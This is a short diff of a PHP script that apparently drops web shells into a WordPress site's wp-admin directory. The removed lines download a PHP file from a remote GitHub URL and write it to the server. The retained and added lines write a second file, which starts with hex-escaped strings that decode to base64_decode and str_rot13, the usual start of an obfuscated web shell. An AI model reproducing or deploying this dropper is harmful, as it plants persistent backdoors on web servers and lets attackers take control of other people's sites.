@@ -25,18 +25,8 @@ if (!file_exists($test_dir)) {
  
   echo "LegioNLeakeR";
 }
-$path = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url);
-
-$sh = file_get_contents("https://raw.githubusercontent.com/ALiReZa-VaKeR/legA/main/A.php");
-$f = fopen($path, "w");
-if ($f === false) {
-    @file_put_contents($path, $sh);
-} else {
-    $bytes_written = fwrite($f, $sh);
-    fclose($f);
-}
-
-$path_u = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/up_' . file_name($url);
+ 
+$path_u = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url);
 $sh_u = '<?php
 $_ = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
 $__ = "\x73\x74\x72\x5f\x72\x6f\x74\x31\x33";
